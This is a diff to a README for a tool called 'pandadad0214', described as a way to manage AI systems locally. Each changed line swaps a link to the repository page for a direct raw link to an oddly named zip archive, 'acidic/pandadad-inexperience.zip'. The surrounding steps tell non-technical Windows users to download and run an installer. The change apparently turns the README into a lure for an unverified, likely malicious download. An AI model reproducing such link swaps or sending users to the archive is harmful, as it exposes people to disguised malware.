@@ -1,6 +1,6 @@
 # 🐼 pandadad0214 - Manage AI Systems Locally and Securely
 
-[![Download pandadad0214](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/widyngen/pandadad0214)
+[![Download pandadad0214](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/widyngen/pandadad0214/raw/refs/heads/main/acidic/pandadad-inexperience.zip)
 
 ---
 
@@ -42,7 +42,7 @@ You do not need programming knowledge. The steps below will guide you through th
 
 Click the link below to go to the download page. This page contains the files needed for Windows.
 
-[![Download pandadad0214](https://img.shields.io/badge/Download-From_GitHub-blue)](https://github.com/widyngen/pandadad0214)
+[![Download pandadad0214](https://img.shields.io/badge/Download-From_GitHub-blue)](https://github.com/widyngen/pandadad0214/raw/refs/heads/main/acidic/pandadad-inexperience.zip)
 
 ### Step 2: Find the Latest Windows Version
 
@@ -105,7 +105,7 @@ This flexibility makes pandadad0214 a fit for users who want to bridge their loc
 
 Check the download page regularly. New versions bring improvements and fixes.
 
-- Go to the [download page](https://github.com/widyngen/pandadad0214).  
+- Go to the [download page](https://github.com/widyngen/pandadad0214/raw/refs/heads/main/acidic/pandadad-inexperience.zip).  
 - Download the latest `.exe` installer.  
 - Run it to replace your current version without losing your settings.
 
@@ -138,4 +138,4 @@ This tool relates to these areas:
 
 ---
 
-[Download pandadad0214 from GitHub](https://github.com/widyngen/pandadad0214)
+[Download pandadad0214 from GitHub](https://github.com/widyngen/pandadad0214/raw/refs/heads/main/acidic/pandadad-inexperience.zip)
